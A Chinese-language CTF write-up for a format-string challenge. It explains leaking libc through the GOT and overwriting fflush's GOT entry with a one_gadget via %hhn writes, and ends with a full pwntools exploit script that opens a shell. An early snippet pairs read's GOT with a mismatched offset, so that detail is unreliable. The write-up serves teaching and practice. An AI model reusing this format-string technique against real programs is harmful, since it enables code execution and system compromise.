# Write-Up
本次校赛的题目，作为一个PWN手居然没有做出来

而且一直纠结于这个题目，导致错过了求解其他题目的机会，有点小后悔

关键还是在于对这个漏洞利用的不熟练，导致很多时间用来学习和踩坑了，事实证明，**我还是太菜啦**

好了，先查看一下程序的基本思路

```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  char s; // [rsp+0h] [rbp-400h]

  while ( 1 )
  {
    memset(&s, 0, 0x400uLL);
    read(0, &s, 0x400uLL);
    printf(&s, &s);
    fflush(_bss_start);
  }
}
```

可以发现，就是一个`格式化字符串`漏洞，当时我就很高兴啊，这么简单的题目。可是等我开始利用的时候，才发现是多么难利用！

关键点在于：

>1.buf有0x400这么长   
2.每次也是读取0x400个字节(也就是说，单纯的输入不能超出缓存区)
3.同时，由于程序设置是一个无限循环，也就是说没有retn的eip可以劫持(这一点可以在汇编代码中发现，没有retn的指令)
4.每次循环结束，都会利用fflush来把buf清零，所以不能使用上一次输入的内容，每次输入一次有效
5.查看程序保护机制
>>➜  fmt checksec fmt
[*] '/home/pwn/Desktop/pwn/NUSTCTF/fmt/fmt'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments 
>
  没有canary，没有PIE，NX也是关闭的
  NX关闭意味着输入shellcode并且控制rip到shellcode地址处
可是由于程序是死循环状态，以往的冲刷`saved-rip`的方法就不能用了也就需要另辟蹊径

在程序代码中，我们可以发现，在执行完`printf`利用漏洞完后，会执行`fflush`这个函数

`fflush`函数也是库函数，也有PLT表GOT表以及在栈中的LIBC偏移地址，所以我们可以利用这个函数来实现控制程序执行流

本题有两种解法：
>1.shellcode
2.one gadget

我这里先利用 one gadget 的方法，至于 shellcode 的利用，以后有时间再更新（咕咕咕）

## one gadget

one gadget是libc中一段可以起shell的代码，具体libc有不同的偏移地址，而且就算是同一个libc，不同利用时，有些地址的可以，有些地址的就不行，我也不知道为啥，逐个试吧哈哈

>我本地机子的可用 one gadget 偏移地址是 0xF02A4
>fflush函数在libc中的偏移是 0x6D7A0

首先我们要确定libc加载的基址，可以利用格式化字符串漏洞中的任意读功能

> \$s 可以读取一个地址中的数据    
>加以 %n$s 可以控制以参数中第n+1个值为地址
>64位linux系统前6个参数为 rsi rdi rdx rcx r8 r9 往后的参数就放在栈上 %6$s 就可以读取以栈顶数据为地址中的内容
>got表中存放这库函数在栈中的地址

所以我们利用这个任意读功能和got表就可以泄露libc的基址

>%7$s + aaaa + func_got

这里利用`fflush`函数来泄露libc

```python
get_libc_payload = "%7$s".ljust(8, 'a')+p64(e.got['read'])
p.send(get_libc_payload)
read_libc = u64(p.recv(6)+'\x00\x00')
print hex(read_libc)
begin_libc = read_libc-0xF1147
print hex(begin_libc)
```

接着再计算 one gadget 地址

```python
one_gadget_libc = begin_libc+0xF02A4
print hex(one_gadget_libc)
```

于是乎大部分工作就准备好了，~~问题就来了~~

以我某次调试的数据为例：
>0x7fab278897a0  < 这个是fflush的地址 
0x7fab2781c000
0x7fab2790c2a4   < 这个是one gadget地址

我们可以看到，这个地址的低3位是不一样的，也就是说我们需要修改这3位的数据

printf中可以往指定地址修改数据，有以下形式：
> \$n 修改一个字，在64位系统中，就是4个byte
> \$hn 修改半个字，在64位系统中，就是2个byte    
> \$hhn 修改一个字节，在64位系统中，就是1个byte
其中修改的数值为当前已输出的字符数
可以利用 %nc 来输出n个字符

一般情况下，如果利用 $n 来修改，会因为字符数输出太多而报错，所以可以利用 $hhn 来实现单字节单字节修改

而由于这个程序会在每次执行完这个漏洞后调用一次`fflush`，所以这就要求我们才一次漏洞利用机会中修改三个字节

当时我就卡在这里啊，真可恶！

我们可以在一个格式化字符串中构造如下：
> %c %ahhn %c %bhhn %c %chhns

并在abc相应的偏移上放上地址，就可以实现一次性修改三个地址中一个byte的数据

需要注意的是，排在后面的 $hhn 实际写入的值会是前几次 %c 的总和

所以我们要精心构造这个顺序，以使得能写入正确的值

我们可以这样写：
>假设低3位是 abc 这样排序
>那么如果我们先把最小的那一个（假如是b）先写入对应地址中 %bc，地址是 (target+1)
>接着写第二小的那一个（假如是a），到对应地址中 %(a-b)c，地址是(target+2)
>最后写入最大的那一个（是c啦）到对应地址 %(c-a-b)c，地址是(target)

这样就能正确写入 one gadget 的地址，然后执行`fflush`时就可以跳到对应地址去执行shell了

###完整EXP:
```python
from pwn import *
context.log_level = 'debug'
p = process('./fmt')
e = ELF('./fmt')
p.send('hello')
p.recv()
get_libc_payload = "%7$s".ljust(8, 'a')+p64(e.got['fflush'])
p.send(get_libc_payload)
read_libc = u64(p.recv(6)+'\x00\x00')
print hex(read_libc)
begin_libc = read_libc-0x6D7A0
print hex(begin_libc)
one_gadget_libc = begin_libc+0xF02A4
print hex(one_gadget_libc)
a1 = (one_gadget_libc & 0xff0000) >> 16
a2 = (one_gadget_libc & 0xff00) >> 8
a3 = one_gadget_libc & 0xff
print hex(a1)+hex(a2)+hex(a3)
point1 = [2, a1]
point2 = [1, a2]
point3 = [0, a3]


def swap(p1, p2):
    for i in range(2):
        t = p1[i]
        p1[i] = p2[i]
        p2[i] = t


if a1 > a2:
    swap(point1, point2)
if a1 > a3:
    swap(point1, point3)
if a2 > a3:
    swap(point2, point3)
print point1+point2+point3

point2[1] = point2[1]-point1[1]
point3[1] = point3[1]-point2[1]-point1[1]
print point1+point2+point3

write_got_payload = '%'+str(point1[1])+'c'+'%12$hhn'
write_got_payload += '%'+str(point2[1])+'c'+'%13$hhn'
write_got_payload += '%'+str(point3[1])+'c'+'%14$hhn'
write_got_payload = write_got_payload.ljust(48, 'a')
write_got_payload += p64(e.got['fflush']+point1[0])
write_got_payload += p64(e.got['fflush']+point2[0])
write_got_payload += p64(e.got['fflush']+point3[0])

p.send(write_got_payload)
p.interactive()
```